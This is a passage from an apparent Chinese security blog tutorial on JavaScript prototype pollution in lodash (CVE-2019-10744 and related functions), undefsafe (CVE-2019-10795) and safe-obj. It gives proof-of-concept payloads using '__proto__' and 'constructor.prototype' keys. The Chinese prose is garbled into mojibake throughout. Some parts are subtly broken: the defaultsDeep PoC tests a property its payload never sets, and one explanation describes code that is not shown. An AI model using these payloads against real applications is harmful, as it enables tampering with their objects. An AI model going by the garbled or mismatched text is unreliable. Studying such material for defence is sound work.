key in objB)</code>å¾ªç¯è¿­ä»£æ¯ä¸ªå±æ€§ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå±æ€§çš„åç§°æ˜¯<code>__proto__</code>ã€‚<br>ç”±äºå®ƒå§‹ç»ˆæ˜¯Objectç±»å‹ï¼Œå› æ­¤å®ƒå¼€å§‹é€’å½’è°ƒç”¨ï¼Œè¿™æ¬¡æ˜¯<code>merge(objA[__proto__], objB[__proto__])</code>ã€‚è¿™å®é™…ä¸Šå¸®åŠ©æˆ‘ä»¬è®¿é—®äº†objAçš„å‡½æ•°åŸå‹ï¼Œå¹¶å‘objBçš„<code>proto</code>å±æ€§ä¸­å®šä¹‰çš„æ–°å±æ€§è¿›è¡Œäº†æ·»åŠ ã€‚</p><p>éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œåªæœ‰ä¸å®‰å…¨çš„é€’å½’åˆå¹¶å‡½æ•°æ‰ä¼šå¯¼è‡´åŸå‹é“¾æ±¡æŸ“ï¼Œéé€’å½’çš„ç®—æ³•æ˜¯ä¸ä¼šå¯¼è‡´åŸå‹é“¾æ±¡æŸ“çš„</p><h3 id="Lodash-æ¨¡å—åŸå‹é“¾æ±¡æŸ“"><a href="#Lodash-æ¨¡å—åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="Lodash æ¨¡å—åŸå‹é“¾æ±¡æŸ“"></a>Lodash æ¨¡å—åŸå‹é“¾æ±¡æŸ“</h3><h4 id="lodash-defaultsDeep-æ–¹æ³•é€ æˆçš„åŸå‹é“¾æ±¡æŸ“ï¼ˆCVE-2019-10744ï¼‰"><a href="#lodash-defaultsDeep-æ–¹æ³•é€ æˆçš„åŸå‹é“¾æ±¡æŸ“ï¼ˆCVE-2019-10744ï¼‰" class="headerlink" title="lodash.defaultsDeep æ–¹æ³•é€ æˆçš„åŸå‹é“¾æ±¡æŸ“ï¼ˆCVE-2019-10744ï¼‰"></a>lodash.defaultsDeep æ–¹æ³•é€ æˆçš„åŸå‹é“¾æ±¡æŸ“ï¼ˆCVE-2019-10744ï¼‰</h4><p><code>lodash.defaultsDeep</code> æ˜¯ Lodash åº“ä¸­çš„ä¸€ä¸ªå®ç”¨å‡½æ•°ï¼Œç”¨äºæ·±åº¦åˆå¹¶å¤šä¸ªå¯¹è±¡çš„å±æ€§ã€‚å®ƒæ¥å—ä¸€ä¸ªç›®æ ‡å¯¹è±¡å’Œä¸€ä¸ªæˆ–å¤šä¸ªæºå¯¹è±¡ï¼Œå¹¶å°†æºå¯¹è±¡çš„å±æ€§é€’å½’åœ°åˆå¹¶åˆ°ç›®æ ‡å¯¹è±¡ä¸­ï¼Œå¦‚æœå±æ€§åœ¨ç›®æ ‡å¯¹è±¡ä¸­ä¸å­˜åœ¨ï¼Œåˆ™æ·»åŠ è¯¥å±æ€§ã€‚</p><p>ä¸ <code>Object.assign</code> æˆ–æµ…å±‚åˆå¹¶æ–¹æ³•ä¸åŒï¼Œ<code>lodash.defaultsDeep</code> æ‰§è¡Œæ·±åº¦åˆå¹¶ï¼Œå¯ä»¥åˆå¹¶åµŒå¥—å¯¹è±¡çš„å±æ€§ã€‚å®ƒä¼šé€’å½’éå†æºå¯¹è±¡ï¼Œå¹¶å°†å…¶å±æ€§åˆå¹¶åˆ°ç›®æ ‡å¯¹è±¡ä¸­ï¼Œå¦‚æœå±æ€§æ˜¯å¯¹è±¡ï¼Œåˆ™è¿›ä¸€æ­¥é€’å½’åˆå¹¶ã€‚</p><p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªä½¿ç”¨ <code>lodash.defaultsDeep</code> çš„ç¤ºä¾‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> defaultConfig = &#123;</span><br><span class="line">  <span class="attr">server</span>: &#123;</span><br><span class="line">    <span class="attr">host</span>: <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="attr">port</span>: <span class="number">3000</span>,</span><br><span class="line">    <span class="attr">timeout</span>: <span class="number">5000</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">database</span>: &#123;</span><br><span class="line">    <span class="attr">host</span>: <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="attr">port</span>: <span class="number">27017</span>,</span><br><span class="line">    <span class="attr">username</span>: <span class="string">&#x27;admin&#x27;</span>,</span><br><span class="line">    <span class="attr">password</span>: <span class="string">&#x27;password&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> userConfig = &#123;</span><br><span class="line">  <span class="attr">server</span>: &#123;</span><br><span class="line">    <span class="attr">port</span>: <span class="number">8080</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">database</span>: &#123;</span><br><span class="line">    <span class="attr">username</span>: <span class="string">&#x27;user&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> mergedConfig = lodash.<span class="title function_">defaultsDeep</span>(userConfig, defaultConfig);</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(mergedConfig);</span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬æœ‰ä¸€ä¸ªé»˜è®¤é…ç½®å¯¹è±¡ <code>defaultConfig</code> å’Œä¸€ä¸ªç”¨æˆ·é…ç½®å¯¹è±¡ <code>userConfig</code>ã€‚é€šè¿‡ä½¿ç”¨ <code>lodash.defaultsDeep</code>ï¼Œæˆ‘ä»¬å°†ç”¨æˆ·é…ç½®åˆå¹¶åˆ°é»˜è®¤é…ç½®ä¸­ï¼Œå½¢æˆä¸€ä¸ªæ–°çš„åˆå¹¶é…ç½®å¯¹è±¡ <code>mergedConfig</code>ã€‚åˆå¹¶åçš„ç»“æœä¼šä¿ç•™é»˜è®¤é…ç½®çš„å±æ€§ï¼Œä½†å¦‚æœç”¨æˆ·é…ç½®ä¸­å­˜åœ¨å¯¹åº”å±æ€§ï¼Œåˆ™ä¼šä½¿ç”¨ç”¨æˆ·é…ç½®ä¸­çš„å€¼ã€‚</p><p>è¾“å‡ºçš„ <code>mergedConfig</code> å¯¹è±¡å¦‚ä¸‹æ‰€ç¤ºï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="attr">server</span>: &#123;</span><br><span class="line">    <span class="attr">host</span>: <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="attr">port</span>: <span class="number">8080</span>,</span><br><span class="line">    <span class="attr">timeout</span>: <span class="number">5000</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">database</span>: &#123;</span><br><span class="line">    <span class="attr">host</span>: <span class="string">&#x27;localhost&#x27;</span>,</span><br><span class="line">    <span class="attr">port</span>: <span class="number">27017</span>,</span><br><span class="line">    <span class="attr">username</span>: <span class="string">&#x27;user&#x27;</span>,</span><br><span class="line">    <span class="attr">password</span>: <span class="string">&#x27;password&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¯ä»¥çœ‹åˆ°ï¼Œåˆå¹¶åçš„é…ç½®å¯¹è±¡åŒ…å«äº†é»˜è®¤é…ç½®å’Œç”¨æˆ·é…ç½®çš„å±æ€§ï¼Œå¹¶ä¸”åœ¨æ·±åº¦åˆå¹¶æ—¶ä¿ç•™äº†åµŒå¥—ç»“æ„ã€‚</p><p>åœ¨Lodashåº“ä¸­defaultsDeepå‡½æ•°å¯ä»¥è¿›è¡Œæ„é€ å‡½æ•°ï¼ˆconstructorï¼‰é‡è½½ï¼Œé€šè¿‡æ„é€ å‡½æ•°é‡è½½çš„æ–¹å¼å¯ä»¥æ¬ºéª—æ·»åŠ æˆ–ä¿®æ”¹Object.prototypeçš„å±æ€§ï¼Œè¿™ä¸ªæ€§è´¨å¯ä»¥è¢«ç”¨äºåŸå‹æ±¡æŸ“ã€‚</p><p><a target="_blank" rel="noopener" href="https://geekdaxue.co/read/lexiansheng@dix8fs/ctg2cr">CVE-2019-10744</a></p><blockquote><p>CVE ID ï¼š CVE-2019-10744<br>æ¼æ´ç­‰çº§ï¼š é«˜å±<br>CVSSè¯„åˆ†ï¼š 7.3<br>å½±å“èŒƒå›´ï¼š 4.17.11ä¹‹å‰çš„æ‰€æœ‰ç‰ˆæœ¬</p></blockquote><p>POC:</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> mergeFn = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>).<span class="property">defaultsDeep</span>;</span><br><span class="line"><span class="keyword">const</span> payload = <span class="string">&#x27;&#123;&quot;constructor&quot;: &#123;&quot;prototype&quot;: &#123;&quot;whoami&quot;: &quot;Vulnerable&quot;&#125;&#125;&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">check</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="title function_">mergeFn</span>(&#123;&#125;, <span class="title class_">JSON</span>.<span class="title function_">parse</span>(payload));</span><br><span class="line">    <span class="keyword">if</span> ((&#123;&#125;)[<span class="string">`a0`</span>] === <span class="literal">true</span>) &#123;</span><br><span class="line">        <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">`Vulnerable to Prototype Pollution via <span class="subst">$&#123;payload&#125;</span>`</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">check</span>();</span><br></pre></td></tr></table></figure><h4 id="lodash-merge-x2F-lodash-mergeWith-æ–¹æ³•é€ æˆçš„åŸå‹é“¾æ±¡æŸ“"><a href="#lodash-merge-x2F-lodash-mergeWith-æ–¹æ³•é€ æˆçš„åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="lodash.merge&#x2F;lodash.mergeWith æ–¹æ³•é€ æˆçš„åŸå‹é“¾æ±¡æŸ“"></a>lodash.merge&#x2F;lodash.mergeWith æ–¹æ³•é€ æˆçš„åŸå‹é“¾æ±¡æŸ“</h4><p>Lodash.merge ä½œä¸º lodash ä¸­çš„å¯¹è±¡åˆå¹¶æ’ä»¶ï¼Œä»–å¯ä»¥é€’å½’åˆå¹¶ <code>sources</code> æ¥æºå¯¹è±¡è‡ªèº«å’Œç»§æ‰¿çš„å¯æšä¸¾å±æ€§åˆ° <code>object</code> ç›®æ ‡å¯¹è±¡ï¼Œä»¥åˆ›å»ºçˆ¶æ˜ å°„å¯¹è±¡ã€‚</p><p>lodash.mergeWithç±»ä¼¼äº <code>merge</code> æ–¹æ³•ã€‚ä½†æ˜¯å®ƒè¿˜ä¼šæ¥å—ä¸€ä¸ª <code>customizer</code>ï¼Œä»¥å†³å®šå¦‚ä½•è¿›è¡Œåˆå¹¶ã€‚ å¦‚æœ <code>customizer</code> è¿”å› <code>undefined</code> å°†ä¼šç”±åˆå¹¶å¤„ç†æ–¹æ³•ä»£æ›¿ã€‚</p><p>POCï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> lodash= <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">&#x27;&#123;&quot;__proto__&quot;:&#123;&quot;whoami&quot;:&quot;Vulnerable&quot;&#125;&#125;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = &#123;&#125;;</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Before whoami: &quot;</span> + a.<span class="property">whoami</span>);</span><br><span class="line">lodash.<span class="title function_">merge</span>(&#123;&#125;, <span class="title class_">JSON</span>.<span class="title function_">parse</span>(payload));</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;After whoami: &quot;</span> + a.<span class="property">whoami</span>);</span><br></pre></td></tr></table></figure><h4 id="lodash-set-x2F-lodash-setWith-æ–¹æ³•é€ æˆçš„åŸå‹é“¾æ±¡æŸ“"><a href="#lodash-set-x2F-lodash-setWith-æ–¹æ³•é€ æˆçš„åŸå‹é“¾æ±¡æŸ“" class="headerlink" title="lodash.set&#x2F;lodash.setWith æ–¹æ³•é€ æˆçš„åŸå‹é“¾æ±¡æŸ“"></a>lodash.set&#x2F;lodash.setWith æ–¹æ³•é€ æˆçš„åŸå‹é“¾æ±¡æŸ“</h4><p><code>lodash.set</code>æ˜¯Lodashåº“ä¸­çš„ä¸€ä¸ªå®ç”¨å‡½æ•°ï¼Œç”¨äºè®¾ç½®å¯¹è±¡ä¸­æŒ‡å®šè·¯å¾„çš„å€¼ã€‚å®ƒå…è®¸ä½ é€šè¿‡æä¾›ä¸€ä¸ªè·¯å¾„å­—ç¬¦ä¸²æ¥æ›´æ–°å¯¹è±¡çš„åµŒå¥—å±æ€§ï¼Œå¦‚æœè·¯å¾„ä¸å­˜åœ¨ï¼Œåˆ™ä¼šè‡ªåŠ¨åˆ›å»ºã€‚</p><p>å…·ä½“æ¥è¯´ï¼Œ<code>lodash.set</code>å‡½æ•°æ¥å—ä¸‰ä¸ªå‚æ•°ï¼šè¦æ“ä½œçš„ç›®æ ‡å¯¹è±¡ã€è¦è®¾ç½®çš„å±æ€§è·¯å¾„ä»¥åŠè¦è®¾ç½®çš„å€¼ã€‚å±æ€§è·¯å¾„å¯ä»¥æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²æˆ–ä¸€ä¸ªæ•°ç»„ï¼Œç”¨äºæè¿°è¦è®¾ç½®çš„å±æ€§åœ¨å¯¹è±¡ä¸­çš„ä½ç½®ã€‚ä¾‹å¦‚ï¼Œå¦‚æœä½ æœ‰ä¸€ä¸ªå¯¹è±¡ <code>user</code>ï¼Œå…¶ä¸­åŒ…å«å±æ€§ <code>name</code>ã€<code>address</code> å’Œ <code>city</code>ï¼Œä½ å¯ä»¥ä½¿ç”¨ <code>lodash.set</code> æ¥è®¾ç½® <code>city</code> å±æ€§çš„å€¼ã€‚</p><p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªä½¿ç”¨ <code>lodash.set</code> çš„ç¤ºä¾‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> lodash = <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> user = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;lazy_fish&#x27;</span>,</span><br><span class="line">  <span class="attr">information</span>: &#123;</span><br><span class="line">    <span class="attr">age</span>: <span class="number">18</span>,</span><br><span class="line">    <span class="attr">lover</span>: <span class="string">&#x27;zhy&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">lodash.<span class="title function_">set</span>(user, <span class="string">&#x27;information.age&#x27;</span>, <span class="number">19</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(user.<span class="property">information</span>.<span class="property">age</span>); <span class="comment">// è¾“å‡º: 19</span></span><br></pre></td></tr></table></figure><p>åœ¨ä¸Šé¢çš„ç¤ºä¾‹ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨ <code>lodash.set</code> å°† <code>user</code> å¯¹è±¡ä¸­ <code>address.city</code> çš„å€¼è®¾ç½®ä¸º <code>&#39;San Francisco&#39;</code>ã€‚å¦‚æœ <code>address.city</code> å±æ€§ä¸å­˜åœ¨ï¼Œåˆ™ä¼šè‡ªåŠ¨åˆ›å»ºå®ƒã€‚</p><p><code>lodash.set</code> å‡½æ•°éå¸¸æœ‰ç”¨ï¼Œç‰¹åˆ«æ˜¯åœ¨å¤„ç†æ·±å±‚åµŒå¥—çš„å¯¹è±¡ç»“æ„æ—¶ã€‚å®ƒæä¾›äº†ä¸€ç§ç®€æ´å’Œå®‰å…¨åœ°æ›´æ–°å¯¹è±¡å±æ€§çš„æ–¹å¼ã€‚</p><p>åœ¨ä½¿ç”¨ Lodash.set æ–¹æ³•æ—¶ï¼Œå¦‚æœæ²¡æœ‰å¯¹ä¼ å…¥çš„å‚æ•°è¿›è¡Œè¿‡æ»¤ï¼Œåˆ™å¯èƒ½ä¼šé€ æˆåŸå‹é“¾æ±¡æŸ“ã€‚</p><p>POCï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> lodash= <span class="built_in">require</span>(<span class="string">&#x27;lodash&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> object_1 = &#123; <span class="string">&#x27;a&#x27;</span>: [&#123; <span class="string">&#x27;b&#x27;</span>: &#123; <span class="string">&#x27;c&#x27;</span>: <span class="number">3</span> &#125; &#125;] &#125;;</span><br><span class="line"><span class="keyword">var</span> object_2 = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object_1.<span class="property">whoami</span>);</span><br><span class="line"><span class="comment">//lodash.set(object_2, &#x27;object_2[&quot;__proto__&quot;][&quot;whoami&quot;]&#x27;, &#x27;Vulnerable&#x27;);</span></span><br><span class="line">lodash.<span class="title function_">set</span>(object_2, <span class="string">&#x27;__proto__.[&quot;whoami&quot;]&#x27;</span>, <span class="string">&#x27;Vulnerable&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object_1.<span class="property">whoami</span>);</span><br></pre></td></tr></table></figure><h3 id="Undefsafe-æ¨¡å—åŸå‹é“¾æ±¡æŸ“ï¼ˆCVE-2019-10795ï¼‰"><a href="#Undefsafe-æ¨¡å—åŸå‹é“¾æ±¡æŸ“ï¼ˆCVE-2019-10795ï¼‰" class="headerlink" title="Undefsafe æ¨¡å—åŸå‹é“¾æ±¡æŸ“ï¼ˆCVE-2019-10795ï¼‰"></a>Undefsafe æ¨¡å—åŸå‹é“¾æ±¡æŸ“ï¼ˆCVE-2019-10795ï¼‰</h3><p><code>undefsafe</code> æ˜¯ä¸€ä¸ª JavaScript æ¨¡å—ï¼Œç”¨äºå®‰å…¨åœ°è®¿é—®å’Œæ“ä½œåµŒå¥—å¯¹è±¡çš„å±æ€§ã€‚å®ƒæä¾›äº†ä¸€ç§ç®€æ´çš„æ–¹æ³•æ¥å¤„ç†å¯èƒ½å­˜åœ¨çš„æœªå®šä¹‰æˆ–ç©ºå€¼çš„å±æ€§è·¯å¾„ï¼Œä»¥é¿å…å¼•å‘å¼‚å¸¸é”™è¯¯ã€‚</p><p>é€šå¸¸ï¼Œåœ¨è®¿é—®æ·±å±‚åµŒå¥—çš„å¯¹è±¡å±æ€§æ—¶ï¼Œå¦‚æœæŸä¸ªä¸­é—´å±æ€§ä¸å­˜åœ¨ï¼Œå°è¯•è®¿é—®å®ƒçš„å±æ€§ä¼šå¯¼è‡´ TypeError å¼‚å¸¸ã€‚ä¸ºäº†é¿å…è¿™ç§å¼‚å¸¸ï¼Œå¼€å‘äººå‘˜é€šå¸¸éœ€è¦ç¼–å†™å†—é•¿çš„æ¡ä»¶è¯­å¥æ¥æ£€æŸ¥æ¯ä¸ªå±æ€§æ˜¯å¦å­˜åœ¨ã€‚</p><p><code>undefsafe</code> æ¨¡å—çš„ç›®æ ‡æ˜¯ç®€åŒ–è¿™ä¸ªè¿‡ç¨‹ã€‚å®ƒæä¾›äº†ä¸€ä¸ªå‡½æ•°ï¼Œå¯ä»¥æ¥å—ä¸€ä¸ªå¯¹è±¡å’Œä¸€ä¸ªå±æ€§è·¯å¾„å­—ç¬¦ä¸²ï¼Œå¹¶å®‰å…¨åœ°è®¿é—®è¯¥å±æ€§è·¯å¾„ï¼Œå³ä½¿ä¸­é—´å±æ€§ä¸å­˜åœ¨ä¹Ÿä¸ä¼šå¼•å‘å¼‚å¸¸ã€‚å¦‚æœå±æ€§è·¯å¾„æœ‰æ•ˆï¼Œå®ƒå°†è¿”å›å¯¹åº”å±æ€§çš„å€¼ï¼›å¦åˆ™ï¼Œè¿”å› undefinedã€‚</p><p>ä»¥ä¸‹æ˜¯ä¸€ä¸ªä½¿ç”¨ <code>undefsafe</code> çš„ç¤ºä¾‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> undefsafe = <span class="built_in">require</span>(<span class="string">&#x27;undefsafe&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> user = &#123;</span><br><span class="line">  <span class="attr">name</span>: <span class="string">&#x27;lazy_fish&#x27;</span>,</span><br><span class="line">  <span class="attr">information</span>: &#123;</span><br><span class="line">    <span class="attr">age</span>: <span class="number">18</span>,</span><br><span class="line">    <span class="attr">lover</span>: <span class="string">&#x27;zhy&#x27;</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> cityName = <span class="title function_">undefsafe</span>(user, <span class="string">&#x27;information.age&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(cityName); <span class="comment">// è¾“å‡º: 18</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> postalCode = <span class="title function_">undefsafe</span>(user, <span class="string">&#x27;information.school&#x27;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(postalCode); <span class="comment">// è¾“å‡º: undefined</span></span><br></pre></td></tr></table></figure><p><code>undefsafe</code> æ¨¡å—ç®€åŒ–äº†å¤„ç†åµŒå¥—å¯¹è±¡å±æ€§çš„ä»£ç ï¼Œä½¿ä»£ç æ›´åŠ ç®€æ´å’Œå¯è¯»ã€‚å®ƒç‰¹åˆ«é€‚ç”¨äºå¤„ç†ä»å¤–éƒ¨æ•°æ®æºè·å–çš„å¯¹è±¡ç»“æ„ï¼Œå¯ä»¥å®‰å…¨åœ°å¤„ç†ç¼ºå¤±æˆ–ä¸å®Œæ•´çš„æ•°æ®ã€‚</p><p><a target="_blank" rel="noopener" href="https://security.snyk.io/vuln/SNYK-JS-UNDEFSAFE-548940">CVE-2019-10795</a></p><blockquote><p>**CVE Dictionary Entry:**CVE-2019-10795<br>**NVD Published Date:**02&#x2F;18&#x2F;2020<br>**NVD Last Modified:**02&#x2F;27&#x2F;2020<br>**Source:**Snyk</p></blockquote><p>æˆ‘ä»¬åœ¨ 2.0.3 ç‰ˆæœ¬ä¸­è¿›è¡Œæµ‹è¯•ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="built_in">require</span>(<span class="string">&quot;undefsafe&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> object = &#123;</span><br><span class="line">    <span class="attr">a</span>: &#123;</span><br><span class="line">        <span class="attr">b</span>: &#123;</span><br><span class="line">            <span class="attr">c</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">d</span>: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],</span><br><span class="line">            <span class="attr">e</span>: <span class="string">&#x27;skysec&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">&quot;__proto__.toString&quot;</span>;</span><br><span class="line"><span class="title function_">a</span>(object,payload,<span class="string">&quot;evilstring&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object.<span class="property">toString</span>);</span><br><span class="line"><span class="comment">// [Function: toString]</span></span><br></pre></td></tr></table></figure><p>ä½†æ˜¯å¦‚æœåœ¨ä½äº 2.0.3 ç‰ˆæœ¬è¿è¡Œï¼Œåˆ™ä¼šå¾—åˆ°å¦‚ä¸‹è¾“å‡ºï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> a = <span class="built_in">require</span>(<span class="string">&quot;undefsafe&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> object = &#123;</span><br><span class="line">    <span class="attr">a</span>: &#123;</span><br><span class="line">        <span class="attr">b</span>: &#123;</span><br><span class="line">            <span class="attr">c</span>: <span class="number">1</span>,</span><br><span class="line">            <span class="attr">d</span>: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>],</span><br><span class="line">            <span class="attr">e</span>: <span class="string">&#x27;skysec&#x27;</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">&quot;__proto__.toString&quot;</span>;</span><br><span class="line"><span class="title function_">a</span>(object,payload,<span class="string">&quot;evilstring&quot;</span>);</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(object.<span class="property">toString</span>);</span><br><span class="line"><span class="comment">//evilstring</span></span><br></pre></td></tr></table></figure><p>å¥½è€¶ï¼ï¼ï¼ï¼</p><h3 id="safe-objåŸå‹é“¾æ±¡æŸ“ï¼ˆCVE-2021-25928ï¼‰"><a href="#safe-objåŸå‹é“¾æ±¡æŸ“ï¼ˆCVE-2021-25928ï¼‰" class="headerlink" title="safe-objåŸå‹é“¾æ±¡æŸ“ï¼ˆCVE-2021-25928ï¼‰"></a>safe-objåŸå‹é“¾æ±¡æŸ“ï¼ˆCVE-2021-25928ï¼‰</h3><p>safe-objæ¨¡å—æ˜¯ä¸€ä¸ªJavaScriptæ¨¡å—ï¼Œæä¾›äº†ä¸€äº›å¯æ“ä½œå¯¹è±¡çš„æ–¹æ³•ã€‚</p><p>ç¤ºä¾‹ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ä½¿ç”¨safe-objæ¨¡å—å®‰å…¨åœ°è·å–æ·±å±‚å¯¹è±¡</span></span><br><span class="line"><span class="keyword">const</span> safeObj = <span class="built_in">require</span>(<span class="string">&#x27;safe-obj&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> obj = &#123;</span><br><span class="line">  <span class="attr">prop1</span>: &#123;</span><br><span class="line">    <span 